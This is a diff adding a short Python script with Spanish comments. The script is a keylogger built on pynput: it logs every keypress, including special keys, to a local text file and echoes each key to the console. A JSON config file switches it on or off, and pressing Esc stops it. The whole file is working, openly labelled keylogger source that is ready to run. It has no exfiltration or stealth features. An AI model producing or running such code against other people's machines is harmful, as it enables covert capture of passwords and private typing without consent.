@@ -1,0 +1,53 @@
+import json
+from pynput import keyboard
+
+def on_keypress(key, carpeta_guardado):
+    try:
+        key_str = key.char  # Intentamos obtener el carácter
+        
+        with open(carpeta_guardado, 'a') as f:
+            f.write(f'Key: {key_str}\n')
+        print(f'Key: {key_str}')
+    except AttributeError:
+        # Si no se puede obtener el carácter, verificamos si es una tecla especial
+        if isinstance(key, keyboard.Key):
+            key_str = key.name  # Utilizamos el nombre de la tecla especial
+            
+            with open(carpeta_guardado, 'a') as f:
+                f.write(f'Key: {key_str}\n')
+            print(f'Key: {key_str}')
+
+def on_keyrelease(key):
+    if key == keyboard.Key.esc:
+        return False
+
+if __name__ == "__main__":
+    # Función para cargar la configuración desde un archivo JSON
+    def load_config(filename):
+        try:
+            with open(filename, 'r') as file:
+                return json.load(file)
+        except FileNotFoundError:
+            # Si el archivo no existe, cargar la configuración predeterminada desde config_default.json
+            with open('config_default.json', 'r') as default_file:
+                return json.load(default_file)
+
+    # Nombre del archivo de configuración
+    config_filename = 'config.json'
+
+    # Cargar la configuración
+    config = load_config(config_filename)
+
+    # Guardar la configuración inicial si el archivo no existe
+    with open(config_filename, 'w') as file:
+        json.dump(config, file, indent=4)
+
+    # Ruta del archivo donde se guardarán los registros del Keylogger     
+    carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
+    keylogger_active = config.get('keylogger_active', False)
+
+    if keylogger_active:
+        with keyboard.Listener(on_press=lambda key: on_keypress(key, carpeta_guardado), on_release=on_keyrelease) as listener:
+            listener.join()
+    else:
+        print('Se desactivó la función del keylogger en el archivo config.json')
